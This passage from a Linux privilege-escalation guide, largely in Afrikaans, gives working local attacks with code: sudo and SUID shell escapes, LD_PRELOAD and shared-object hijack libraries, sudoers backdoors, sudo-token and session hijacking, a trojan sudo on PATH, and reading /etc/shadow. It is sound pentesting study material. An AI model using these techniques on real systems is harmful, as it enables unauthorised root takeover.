Nadat die `socat`-konneksie opgestel is, kan jy opdragte direk in die container uitvoer met root-vlak toegang tot die gasheer se lêerstelsel.

### Ander

Let wel dat as jy skryfpermisies oor die docker socket het omdat jy **binne die groep `docker` is** jy [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). As die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy agterkom dat jy die **`ctr`** opdrag kan gebruik, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy agterkom dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gesofistikeerde **inter-Process Communication (IPC) system** wat toepassings in staat stel om doeltreffend met mekaar te interakteer en data te deel. Ontwerp met die moderne Linux-stelsel in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.

Die stelsel is veelsydig, en ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, wat herinner aan **enhanced UNIX domain sockets**. Boonop help dit met die uitsaai van gebeure of seine, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth daemon oor 'n inkomende oproep kan 'n musiekspeler laat demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n afgeleë objekstelsel, wat diensversoeke en metode-aanroepe tussen toepassings vereenvoudig en prosesse wat tradisioneel kompleks was, stroomlyn.

D-Bus werk op 'n **allow/deny model**, en bestuur boodskappermisies (metode-aanroepe, seinuitstuur, ens.) gebaseer op die kumulatiewe effek van ooreenkomende beleidreëls. Hierdie beleide spesifiseer interaksies met die bus, wat potensieel privilege escalation kan toelaat deur die uitbuiting van hierdie permissies.

'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word gegee, wat permissies beskryf vir die root-gebruiker om eienaarskap te hê, boodskappe na te stuur en te ontvang van `fi.w1.wpa_supplicant1`.

Beleide sonder 'n gespesifiseerde gebruiker of groep is universeel van toepassing, terwyl "default" konteksbeleide geld vir almal wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om die D-Bus kommunikasie te enumerate en te exploit hier:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Dit is altyd interessant om die network te enumerate en die posisie van die masjien vas te stel.

### Algemene enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop en waarmee jy nie kon kommunikeer voordat jy toegang daartoe gekry het nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Kyk of jy verkeer kan sniff. As jy dit kan, kan jy moontlik sekere credentials vang.
```
timeout 1 tcpdump
```
## Gebruikers

### Algemene Enumerasie

Kontroleer wie jy is, watter **privileges** jy het, watter **users** in die stelsels is, watter van hulle kan **login** en watter van hulle het **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is deur 'n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om voorregte te eskaleer. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Benut dit** met: **`systemd-run -t /bin/bash`**

### Groeppe

Kyk of jy 'n **lid van 'n groep** is wat jou root-voorregte kan gee:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kyk of daar iets interessant in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy **enige wagwoord** van die omgewing **ken, probeer om as elke gebruiker aan te meld** met daardie wagwoord.

### Su Brute

As jy nie omgee om baie geraas te maak nie en die `su` en `timeout` binaries op die rekenaar teenwoordig is, kan jy probeer om gebruikers te brute-force deur [su-bruteforce](https://github.com/carlospolop/su-bruteforce) te gebruik.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare PATH misbruik

### $PATH

As jy ontdek dat jy **binne 'n gids van die $PATH kan skryf** mag dit moontlik wees om bevoegdhede te eskaleer deur 'n **backdoor binne die skryfbare gids te skep** met die naam van 'n opdrag wat deur 'n ander gebruiker (idealiter root) uitgevoer gaan word en wat **nie vanaf 'n gids gelaai word wat vóór jou skryfbare gids in $PATH geleë is** nie.

### SUDO and SUID

Jy mag toegelaat word om 'n opdrag met sudo uit te voer of dit kan die suid-bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte commands laat jou toe om lêers te read en/of write of selfs 'n command te execute.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie kan 'n gebruiker toelaat om 'n kommando met 'n ander gebruiker se voorregte uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer, dit is nou triviaal om 'n shell te kry deur 'n ssh key in die root-gids te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie direktief laat die gebruiker toe om **'n omgewingsveranderlike in te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **kwesbaar** vir **PYTHONPATH hijacking** om 'n arbitrêre python-biblioteek te laai terwyl die skrip as root uitgevoer is:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV behou deur sudo env_keep → root shell

As sudoers `BASH_ENV` bewaar (bv., `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag benut om ewekansige kode as root uit te voer wanneer 'n toegelate opdrag aangeroep word.

- Waarom dit werk: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en laai daardie lêer in voordat die teikenskrip uitgevoer word. Baie sudo-reëls laat toe om 'n skrip of 'n shell-wrapper uit te voer. As `BASH_ENV` deur sudo bewaar word, word jou lêer met root-regte ingelaai.

- Vereistes:
- 'n sudo-reël wat jy kan uitvoer (enige teiken wat `/bin/bash` nie-interaktief aanroep, of enige bash-skrip).
- `BASH_ENV` teenwoordig in `env_keep` (kontroleer met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`, verkies `env_reset`.
- Vermy shell-wrappers vir sudo-toegelate opdragte; gebruik minimale binaries.
- Oorweeg sudo I/O-logging en waarskuwings wanneer bewaarde env vars gebruik word.

### Paaie wat sudo-uitvoering omseil

**Spring** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sonder opdragpad

As die **sudo permission** aan 'n enkele opdrag gegee word **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH-variabele te verander
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binary **'n ander opdrag uitvoer sonder om die pad daarvoor te spesifiseer (kontroleer altyd die inhoud van 'n vreemde SUID binary met** _**strings**_ **)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary met opdragpad

As die **suid** binary **'n ander opdrag uitvoer en die pad spesifiseer**, dan kan jy probeer om 'n **export a function** te skep wat dieselfde naam het as die opdrag wat die suid-lêer aanroep.

Byvoorbeeld, as 'n suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie funksie uitgevoer word

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer shared libraries (.so files) te spesifiseer wat deur die loader voor alle ander gelaai word, insluitend die standaard C library (`libc.so`). Hierdie proses staan bekend as die voorlaai van 'n library.

Om die stelselsekuriteit te handhaaf en te verhoed dat hierdie funksie uitgebuit word, veral by **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die real user ID (_ruid_) nie met die effective user ID (_euid_) ooreenstem nie.
- Vir uitvoerbare lêers met suid/sgid word slegs libraries in standaardpaaie wat ook suid/sgid is voorgelaai.

Privilege escalation kan voorkom as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die stelling **env_keep+=LD_PRELOAD** bevat. Hierdie konfigurasie laat toe dat die **LD_PRELOAD** omgewingsveranderlike behoue bly en steeds erken word, selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van arbitrêre kode met verhoogde voorregte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompileer dit** met:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Laastens, **escalate privileges** uit te voer
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 'n soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH** env variable beheer, omdat hy die pad beheer waar biblioteke gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID binaire – .so injection

Wanneer jy op 'n binaire met **SUID** toestemmings stuit wat vreemd lyk, is dit 'n goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, as jy 'n fout teëkom soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ dui dit op 'n potensiaal vir exploitation.

Om dit te exploit, sal 'n mens voortgaan deur 'n C-lêer te skep, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie code, sodra dit gecompileer en uitgevoer is, poog om privileges te verhoog deur file permissions te manipuleer en 'n shell met verhoogde privileges uit te voer.

Kompileer die bogenoemde C file na 'n shared object (.so) file met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik behoort die uitvoering van die geaffekteerde SUID binary die exploit te trigger, wat potensiële stelselkompromittering moontlik maak.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID binary gevind het wat 'n library uit 'n folder laad waarin ons kan skryf, laat ons die library in daardie folder skep met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die biblioteek wat jy gegenereer het 'n funksie genaamd `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n gekureerde lys van Unix binaries wat deur 'n aanvaller misbruik kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde maar vir gevalle waar jy **only inject arguments** in a command.

Die projek versamel legitieme funksies van Unix binaries wat misbruik kan word om uit beperkte shells te ontsnap, privileges te eskaleer of te handhaaf, lêers oor te dra, bind- en reverse shells te spawn, en ander post-exploitation take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kontroleer of dit 'n manier vind om enige sudo-reël te misbruik.

### Reusing Sudo Tokens

In gevalle waar jy **sudo access** het maar nie die wagwoord nie, kan jy privileges eskaleer deur **te wag vir 'n sudo-opdrag-uitvoering en dan die sessietoken te kaap**.

Requirements to escalate privileges:

- Jy het reeds 'n shell as user "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets uit te voer in die **laaste 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`)
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ **deur root besit met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) sal **'n sudoers file skep** wat **sudo tokens ewigdurend maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **skryfregte** in die gids het, of op enige van die geskepte lêers daarin, kan jy die binêre [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om 'n **sudo token** vir 'n gebruiker en PID te skep.\  
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy 'n shell as daardie gebruiker met PID 1234 het, kan jy **obtain sudo privileges** sonder om die wagwoord te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel in wie `sudo` kan gebruik en hoe. Hierdie lêers **standaard slegs deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer kan **lees** kan jy moontlik **interessante inligting verkry**, en as jy enige lêer kan **skryf** sal jy in staat wees om **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog 'n manier om hierdie permissies te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo`-binaire, soos `doas` vir OpenBSD; onthou om sy konfigurasie by `/etc/doas.conf` na te gaan.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

As jy weet dat 'n **gebruiker gewoonlik op 'n masjien aansluit en `sudo` gebruik** om voorregte te eskaleer en jy het 'n shell binne daardie gebruikerskonteks, kan jy **create a new sudo executable** wat jou kode as root uitvoer en daarna die gebruiker se opdrag. Daarna, **wysig die $PATH** van die gebruikerskonteks (byvoorbeeld deur die nuwe pad in .bash_profile by te voeg) sodat wanneer die gebruiker `sudo` uitvoer, jou sudo executable uitgevoer word.

Let wel dat as die gebruiker 'n ander shell (nie bash nie) gebruik, jy ander lêers sal moet wysig om die nuwe pad by te voeg. Byvoorbeeld[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog 'n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende uit te voer:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Gewoonlik bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **biblioteke** **gesoek** gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel na biblioteke binne `/usr/local/lib` sal soek**.

As om een of ander rede **'n gebruiker skryfregte het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer wat binne die konfigurasielêers in `/etc/ld.so.conf.d/*.conf` genoem word, kan hy moontlik privilegies eskaleer.\
Kyk na **hoe om hierdie wankonfigurasie uit te buit** op die volgende bladsy:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word, soos in die `RPATH` veranderlike aangedui.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan 'n kwaadaardige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Vermoëns

Linux capabilities provide a **subset of the available root privileges to a process**. Dit breek gevolglik root **privileges op in kleiner en onderskeibare eenhede**. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volledige stel privileges verminder, wat die risiko's van misbruik verlaag.\
Lees die volgende bladsy om **meer te leer oor capabilities en hoe om dit te misbruik**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) verteenwoordig die sekondêre laag van diskresionêre toestemmings, en kan die tradisionele ugo/rwx permissions oorheers. Hierdie toestemmings verbeter beheer oor toegang tot lêers of gidse deur regte toe te ken of te weier vir spesifieke gebruikers wat nie die eienaar of deel van die groep is nie. Hierdie vlak van **granulariteit verseker meer presiese toegangsbestuur**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gee** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Oop shell sessies

In **ou weergawes** kan jy **hijack** 'n **shell** sessie van 'n ander gebruiker (**root**).\
In **nuutste weergawes** sal jy slegs in staat wees om **connect** na screen sessies van **jou eie gebruiker**. Jy kan egter nog steeds interessante inligting binne die sessie vind.

### screen sessions hijacking

**Lys screen sessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dit was 'n probleem met **ou tmux-weergawes**. Ek kon nie 'n tmux (v2.1) sessie, geskep deur root, kaapvat as 'n nie-bevoorregte gebruiker nie.

**Lys tmux-sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Al die SSL- en SSH-sleutels wat tussen September 2006 en 13 Mei 2008 op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) gegenereer is, kan deur hierdie fout geraak wees.\
Hierdie fout ontstaan tydens die skep van 'n nuwe ssh-sleutel op daardie OS, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat alle moontlikhede bereken kan word en dat **as jy die ssh public key het, jy kan soek na die ooreenstemmende private key**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasiewaardes

- **PasswordAuthentication:** Spesifiseer of password authentication toegelaat word. Die standaard is `no`.
- **PubkeyAuthentication:** Spesifiseer of public key authentication toegelaat word. Die standaard is `yes`.
- **PermitEmptyPasswords**: Wanneer password authentication toegelaat word, spesifiseer dit of die bediener aanmelding by rekeninge met leë password strings toelaat. Die standaard is `no`.

### PermitRootLogin

Spesifiseer of root kan aanmeld met ssh, die standaard is `no`. Moontlike waardes:

- `yes`: root kan aanmeld met password en private key
- `without-password` of `prohibit-password`: root kan slegs met 'n private key aanmeld
- `forced-commands-only`: Root kan slegs aanmeld met 'n private key en indien die command-opsies gespesifiseer is
- `no`: nee

### AuthorizedKeysFile

Spesifiseer lêers wat die public keys bevat wat vir user authentication gebruik kan word. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer om aan te meld met die **private** sleutel van die gebruiker "**testusername**", gaan ssh die publieke sleutel van jou sleutel vergelyk met dié wat in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` geleë is.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om jou plaaslike SSH keys te gebruik in plaas daarvan om keys (without passphrases!) op jou bediener te laat staan. Jy sal dus in staat wees om via ssh **jump** **to a host** en van daar **jump to another** host **using** die **key** wat op jou **initial host** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Let daarop dat as `Host` `*` is, elke keer as die gebruiker na 'n ander masjien spring, daardie gasheer sal toegang tot die sleutels hê (wat 'n veiligheidsprobleem is).

Die lêer `/etc/ssh_config` kan hierdie **opsies** **oorskryf** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent forwarding met die sleutelwoord `AllowAgentForwarding` **toelaat** of **weier** (standaard is toelaat).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe shell begin**. Daarom, as jy **enige van hulle kan skryf of wysig, kan jy bevoegdhede eskaleer**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As enige vreemde profielskrip gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow Lêers

Afhangend van die OS kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam hê of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **al hulle te vind** en **te kyk of jy dit kan lees** om te sien **of daar hashes** in die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** in die `/etc/passwd` (of 'n ekwivalente lêer) vind.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbaar /etc/passwd

